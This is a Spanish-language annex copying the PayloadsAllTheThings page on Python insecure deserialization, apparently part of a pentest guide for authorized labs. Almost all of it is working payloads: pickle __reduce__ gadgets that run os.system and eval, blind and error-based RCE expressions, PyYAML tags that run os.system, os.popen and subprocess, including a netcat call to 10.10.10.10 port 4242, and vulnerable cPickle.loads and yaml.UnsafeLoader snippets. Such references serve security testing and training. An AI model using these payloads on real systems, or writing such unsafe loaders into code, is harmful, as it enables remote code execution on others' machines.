# Deserialización insegura: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Insecure Deserialization/Python.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Insecure%20Deserialization/Python.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Python Deserialization / Metodología

### Variantes presentes en tablas o texto del apartado

```text
cPickle.loads
pickle.loads
_pickle.loads
jsonpickle.decode
```

## 2. Metodología / Pickle

```python
import cPickle
from base64 import b64encode, b64decode

class User:
    def __init__(self):
        self.username = "anonymous"
        self.password = "anonymous"
        self.rank     = "guest"

h = User()
auth_token = b64encode(cPickle.dumps(h))
print("Your Auth Token : {}").format(auth_token)
```

```python
new_token = raw_input("New Auth Token : ")
token = cPickle.loads(b64decode(new_token))
print "Welcome {}".format(token.username)
```

```python
import cPickle, os
from base64 import b64encode, b64decode

class Evil(object):
    def __reduce__(self):
        return (os.system,("whoami",))

e = Evil()
evil_token = b64encode(cPickle.dumps(e))
print("Your Evil Token : {}").format(evil_token)
```

```python
import pickle
import base64

class RCE:
    def __reduce__(self):
        return eval, ("__import__('os').system('whoami')",)
pickled = pickle.dumps(RCE())
print(base64.b64encode(pickled).decode())
```

```python
__import__('os').system('whoami') # Reflected RCE
getattr('', __import__('os').popen('whoami').read()) # Error-Based RCE
1 / (__include__("os").popen("id")._proc.wait() == 0) # Boolean-Based RCE
__include__("os").popen("id && sleep 5").read() # Time-Based RCE
```

## 3. Metodología / PyYAML

```yaml
!!python/object/apply:time.sleep [10]
!!python/object/apply:builtins.range [1, 10, 1]
!!python/object/apply:os.system ["nc 10.10.10.10 4242"]
!!python/object/apply:os.popen ["nc 10.10.10.10 4242"]
!!python/object/new:subprocess [["ls","-ail"]]
!!python/object/new:subprocess.check_output [["ls","-ail"]]
```

```yaml
!!python/object/apply:subprocess.Popen
- ls
```

```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
  state:
    update: !!python/name:exec
```

```py
with open('exploit_unsafeloader.yml') as file:
        data = yaml.load(file,Loader=yaml.UnsafeLoader)
```

### Variantes presentes en tablas o texto del apartado

```text
yaml.unsafe_load
yaml.load(input, Loader=yaml.UnsafeLoader)
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
